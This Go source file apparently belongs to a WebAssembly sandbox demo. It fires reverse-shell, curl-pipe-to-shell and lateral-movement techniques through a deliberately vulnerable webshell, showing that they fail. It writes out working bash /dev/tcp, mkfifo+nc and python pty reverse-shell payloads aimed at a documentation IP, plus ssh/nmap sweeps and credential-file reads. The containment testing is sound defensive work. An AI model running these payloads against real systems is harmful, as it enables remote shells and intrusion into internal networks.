package export_wasi_http_incoming_handler

// The /run endpoint behind the five red buttons on /shell.
//
// Almost every remote-shell technique combines three building blocks:
//
//	1. network — an outbound connection to the attacker
//	2. bind    — that socket wired onto a shell's stdin/stdout/stderr
//	3. spawn   — a shell (or interpreter) to run the attacker's commands
//
// Each technique below fires its REAL command line through the webshell's own
// runCmd (exactly what /exec?cmd=…&arg=… would run), then attempts each
// building block directly from inside the component, the way an attacker with
// code execution in this process would. Nothing is simulated: every result is
// the error the runtime actually returned. The attacker address is in
// 203.0.113.0/24 (TEST-NET-3, RFC 5737), which is never routed.
//
// The fourth technique, lateral movement (MITRE ATT&CK T1021), is what an
// attacker does once a remote shell is up: find the neighbours and log in to
// them. It needs the same building blocks pointed inward, at 10.0.0.0/29
// (RFC 1918), and it meets the same absent capabilities. The sweep is a
// handful of addresses and ports: a containment probe, not a scanner.

import (
	"encoding/json"
	"fmt"
	"net"
	"net/url"
	"os"
	"strings"
	"time"

	. "wit_component/internal/wasi_http_types"

	outgoing "wit_component/internal/wasi_http_outgoing_handler"

	. "go.bytecodealliance.org/pkg/wit/types"
)

const (
	attackerHost = "203.0.113.66"
	attackerPort = "4444"
	stageURL     = "http://" + attackerHost + "/stage.sh"

	// Lateral-movement targets: the "internal network" next to the webshell.
	internalHost   = "10.0.0.5"
	internalSubnet = "10.0.0.0/29"
	internalName   = "fileserver.corp.internal"
)

// step is one attempted building block.
type step struct {
	Block   string `json:"block"`              // network | bind | spawn | discover
	Via     string `json:"via"`                // webshell | component
	Action  string `json:"action"`             // what was attempted, in plain terms
	ExecURL string `json:"exec_url,omitempty"` // the /exec request a browser could send
	Result  string `json:"result"`             // the runtime's answer, verbatim
	Why     string `json:"why,omitempty"`      // why the sandbox answered that way
	Blocked bool   `json:"blocked"`
}

type technique struct {
	ID      string `json:"id"`
	Name    string `json:"name"`
	Payload string `json:"payload"` // the one-liner an attacker would send
	Steps   []step `json:"steps"`
}

type report struct {
	Mode         string      `json:"mode"`
	AttackerHost string      `json:"attacker_host"`
	Techniques   []technique `json:"techniques"`
	Attempts     int         `json:"attempts"`
	Blocked      int         `json:"blocked"`
	Verdict      string      `json:"verdict"`
}

func handleRun(rawQuery string) []byte {
	q, _ := url.ParseQuery(rawQuery)
	mode := q.Get("mode")
	if mode == "" {
		mode = "bash"
	}

	var ts []technique
	switch mode {
	case "bash":
		ts = []technique{bashShell()}
	case "python":
		ts = []technique{pythonShell()}
	case "curl":
		ts = []technique{stageAndRun()}
	case "pivot":
		ts = []technique{lateralMovement()}
	case "all":
		ts = []technique{bashShell(), pythonShell(), stageAndRun(), lateralMovement()}
	default:
		return marshal(map[string]string{"error": "unknown mode " + mode + " (bash | python | curl | pivot | all)"})
	}

	r := report{Mode: mode, AttackerHost: attackerHost, Techniques: ts}
	for _, t := range ts {
		for _, s := range t.Steps {
			r.Attempts++
			if s.Blocked {
				r.Blocked++
			}
		}
	}
	if r.Blocked == r.Attempts {
		r.Verdict = fmt.Sprintf("MITIGATED: %d of %d attempts failed. The webshell ran, but the sandbox has no shell to start, no socket to open and no disk to stage on.", r.Blocked, r.Attempts)
	} else {
		r.Verdict = fmt.Sprintf("VULNERABLE: %d of %d attempts succeeded.", r.Attempts-r.Blocked, r.Attempts)
	}

	return marshal(r)
}

// marshal keeps payloads like `>&` readable instead of \u003e\u0026.
func marshal(v any) []byte {
	var b strings.Builder
	enc := json.NewEncoder(&b)
	enc.SetEscapeHTML(false)
	enc.SetIndent("", "  ")
	enc.Encode(v)
	return []byte(b.String())
}

// bash / shell built-ins: /dev/tcp, or mkfifo + nc.
func bashShell() technique {
	devTCP := "/dev/tcp/" + attackerHost + "/" + attackerPort
	payload := "bash -i >& " + devTCP + " 0>&1"
	fifo := "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc " + attackerHost + " " + attackerPort + " > /tmp/f"
	return technique{
		ID:      "bash",
		Name:    "bash / shell built-ins",
		Payload: payload,
		Steps: []step{
			viaWebshell("spawn", "start bash with a /dev/tcp reverse shell", "bash", "-c", payload),
			viaWebshell("spawn", "start sh with a mkfifo + nc reverse shell", "sh", "-c", fifo),
			dial(),
			openFile("bind", "open "+devTCP+" for the shell's stdin/stdout (what bash does under the hood)", devTCP),
		},
	}
}

// python / other interpreters: socket → dup2 onto fds 0/1/2 → pty.spawn a shell.
func pythonShell() technique {
	payload := `import socket,os,pty;s=socket.socket();s.connect(("` + attackerHost + `",` + attackerPort + `));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")`
	return technique{
		ID:      "python",
		Name:    "python / other interpreters",
		Payload: "python3 -c '" + payload + "'",
		Steps: []step{
			viaWebshell("spawn", "start python3 with a socket + dup2 + pty reverse shell", "python3", "-c", payload),
			dial(),
			openFile("bind", "open /dev/ptmx for a pseudo-terminal (what pty.spawn does)", "/dev/ptmx"),
			startProcess("spawn", "spawn /bin/sh as a child of this process", "/bin/sh"),
		},
	}
}

// curl / wget: fetch a stage-2 script, then pipe it into a shell or run it from disk.
func stageAndRun() technique {
	payload := "curl -fsSL " + stageURL + " | sh"
	return technique{
		ID:      "curl",
		Name:    "curl / wget (stage-and-run)",
		Payload: payload,
		Steps: []step{
			viaWebshell("spawn", "start sh to pipe curl into a shell", "sh", "-c", payload),
			viaWebshell("spawn", "start wget to download the stage to disk", "wget", "-qO", "/tmp/stage.sh", stageURL),
			fetch("download "+stageURL+" through the host's outbound HTTP", attackerHost, "/stage.sh"),
			writeFile("bind", "write the downloaded stage to /tmp/stage.sh", "/tmp/stage.sh"),
			startProcess("spawn", "execute the freshly written /tmp/stage.sh", "/tmp/stage.sh"),
		},
	}
}

// lateral movement (T1021): SSH to an internal host, and a small sweep of the
// subnet around it. Remote services (T1021.*), lateral tool transfer (T1570),
// network service discovery (T1046) and remote system discovery (T1018) all
// start with a connection from this process to another machine.
func lateralMovement() technique {
	payload := "ssh -o BatchMode=yes -o ConnectTimeout=2 deploy@" + internalHost + " id"
	return technique{
		ID:      "pivot",
		Name:    "lateral movement (ssh + subnet scan)",
		Payload: payload,
		Steps: []step{
			viaWebshell("spawn", "start ssh to log in to the internal host "+internalHost, "ssh", "-o", "BatchMode=yes", "-o", "ConnectTimeout=2", "deploy@"+internalHost, "id"),
			viaWebshell("spawn", "start nc to check whether "+internalHost+" answers on port 22", "nc", "-zv", "-w", "1", internalHost, "22"),
			viaWebshell("spawn", "start nmap to scan "+internalSubnet+" for remote services", "nmap", "-sT", "-Pn", "-p", "22,445,3389", internalSubnet),
			readFile("discover", "read ~/.ssh/known_hosts for hosts this server has logged in to", "/root/.ssh/known_hosts"),
			readFile("discover", "read /etc/hosts for the names of internal hosts", "/etc/hosts"),
			lookup(internalName),
			dialTo("connect to "+internalHost+":22 over TCP (what ssh does first)", "tcp", internalHost+":22"),
			dialTo("sweep: is there a host at 10.0.0.6? (TCP 22)", "tcp", "10.0.0.6:22"),
			dialTo("sweep: is there a host at 10.0.0.7? (TCP 22)", "tcp", "10.0.0.7:22"),
			dialTo("port scan: "+internalHost+":445 (SMB)", "tcp", internalHost+":445"),
			dialTo("port scan: "+internalHost+":3389 (RDP)", "tcp", internalHost+":3389"),
			udpProbe(internalHost + ":161"),
			dialTo("open a raw ICMP socket to ping "+internalHost, "ip4:icmp", internalHost),
			fetch("request http://"+internalHost+":5985/wsman (WinRM) through the host's outbound HTTP", internalHost+":5985", "/wsman"),
		},
	}
}

// viaWebshell runs the command through the vulnerable runCmd, exactly as
// /exec?cmd=…&arg=… would.
func viaWebshell(block, action, cmd string, args ...string) step {
	execURL := "/exec?cmd=" + url.QueryEscape(cmd)
	for _, a := range args {
		execURL += "&arg=" + url.QueryEscape(a)
	}
	out, err := execCmd(cmd, args)
	s := step{Block: block, Via: "webshell", Action: action, ExecURL: execURL}
	if err != nil {
		s.Result, s.Blocked = err.Error(), true
		s.Why = whyNoProcess
	} else {
		s.Result = strings.TrimSpace(string(out))
	}
	return s
}

// dial attempts the raw outbound TCP connection a reverse shell needs. The
// component imports no wasi:sockets, so there is no host socket to open.
func dial() step {
	return dialTo("connect out to "+attackerHost+":"+attackerPort+" over TCP", "tcp", attackerHost+":"+attackerPort)
}

// dialTo attempts one connection with Go's own net.Dial and reports its error.
func dialTo(action, network, addr string) step {
	s := step{Block: "network", Via: "component", Action: action}
	conn, err := net.DialTimeout(network, addr, 2*time.Second)
	if err != nil {
		s.Result, s.Blocked = err.Error(), true
		s.Why = whyNoSockets
		return s
	}
	conn.Close()
	s.Result = "connected"
	return s
}

// udpProbe sends one datagram. UDP has no handshake, so the stub hands back a
// socket object; the send is where the missing network shows.
func udpProbe(addr string) step {
	s := step{Block: "network", Via: "component", Action: "send a UDP probe to " + addr + " (SNMP)"}
	conn, err := net.DialTimeout("udp", addr, 2*time.Second)
	if err != nil {
		s.Result, s.Blocked = err.Error(), true
		s.Why = whyNoSockets
		return s
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(time.Second))
	if _, err := conn.Write([]byte{0x30, 0x00}); err != nil {
		s.Result, s.Blocked = err.Error(), true
		s.Why = whyNoSockets
		return s
	}
	s.Result = "sent"
	return s
}

// lookup asks DNS for an internal name. Go's resolver needs a UDP socket to
// reach a nameserver, and there is none.
func lookup(name string) step {
	s := step{Block: "discover", Via: "component", Action: "resolve " + name + " through DNS"}
	addrs, err := net.LookupHost(name)
	if err != nil {
		s.Result, s.Blocked = err.Error(), true
		s.Why = whyNoSockets
		return s
	}
	s.Result = strings.Join(addrs, ", ")
	return s
}

// fetch attempts an HTTP GET through the host's outgoing HTTP interface: the
// one network path a component can ask for. The workload grants
// allowedHosts: [], so the host refuses it.
func fetch(action, authority, pathWithQuery string) step {
	s := step{Block: "network", Via: "component", Action: action}

	req := MakeOutgoingRequest(MakeFields())
	req.SetScheme(Some(MakeSchemeHttp()))
	req.SetAuthority(Some(authority))
	req.SetPathWithQuery(Some(pathWithQuery))

	opts := MakeRequestOptions()
	opts.SetConnectTimeout(Some(uint64(2 * time.Second)))

	res := outgoing.Handle(req, Some(opts))
	s.Why = "The workload grants allowedHosts: [], so the host denies every outbound request before it is made."
	if res.IsErr() {
		s.Result, s.Blocked = "host refused the request: "+errorCodeName(res.Err()), true
		return s
	}
	future := res.Ok()
	defer future.Drop()
	poll := future.Subscribe()
	poll.Block()
	poll.Drop()

	got := future.Get()
	if got.IsNone() || got.Some().IsErr() {
		s.Result, s.Blocked = "no response", true
		return s
	}
	if inner := got.Some().Ok(); inner.IsErr() {
		s.Result, s.Blocked = "host refused the request: "+errorCodeName(inner.Err()), true
		return s
	} else {
		resp := inner.Ok()
		s.Result = fmt.Sprintf("HTTP %d", resp.Status())
		resp.Drop()
	}
	return s
}

func openFile(block, action, path string) step {
	s := step{Block: block, Via: "component", Action: action}
	f, err := os.OpenFile(path, os.O_RDWR, 0)
	if err != nil {
		s.Result, s.Blocked = err.Error(), true
		s.Why = whyNoFiles
		return s
	}
	f.Close()
	s.Result = "opened"
	return s
}

func readFile(block, action, path string) step {
	s := step{Block: block, Via: "component", Action: action}
	data, err := os.ReadFile(path)
	if err != nil {
		s.Result, s.Blocked = err.Error(), true
		s.Why = whyNoHostFiles
		return s
	}
	s.Result = fmt.Sprintf("read %d bytes", len(data))
	return s
}

func writeFile(block, action, path string) step {
	s := step{Block: block, Via: "component", Action: action}
	if err := os.WriteFile(path, []byte("#!/bin/sh\nid\n"), 0o755); err != nil {
		s.Result, s.Blocked = err.Error(), true
		s.Why = whyNoFiles
		return s
	}
	s.Result = "written"
	return s
}

func startProcess(block, action, path string) step {
	s := step{Block: block, Via: "component", Action: action}
	p, err := os.StartProcess(path, []string{path}, &os.ProcAttr{})
	if err != nil {
		s.Result, s.Blocked = err.Error(), true
		s.Why = whyNoProcess
		return s
	}
	p.Release()
	s.Result = "started"
	return s
}

const (
	whyNoProcess   = "There is no $PATH and no process table: WASI has no call that starts a process, so there is no shell to run."
	whyNoFiles     = "No filesystem was granted. There is no /dev or /tmp, and no directory to resolve the path against."
	whyNoHostFiles = "No filesystem was granted: the workload mounts no volume, so there is no /etc and no home directory to read targets from."
	whyNoSockets   = "The component imports no wasi:sockets, so Go's runtime answers from an in-memory stub. No packet leaves the sandbox."
)

func errorCodeName(e ErrorCode) string {
	switch e.Tag() {
	case ErrorCodeHttpRequestDenied:
		return "HTTP-request-denied"
	case ErrorCodeDestinationIpProhibited:
		return "destination-IP-prohibited"
	case ErrorCodeDestinationNotFound:
		return "destination-not-found"
	case ErrorCodeConnectionRefused:
		return "connection-refused"
	case ErrorCodeConnectionTimeout:
		return "connection-timeout"
	case ErrorCodeInternalError:
		return "internal-error"
	}
	return fmt.Sprintf("error-code %d", e.Tag())
}
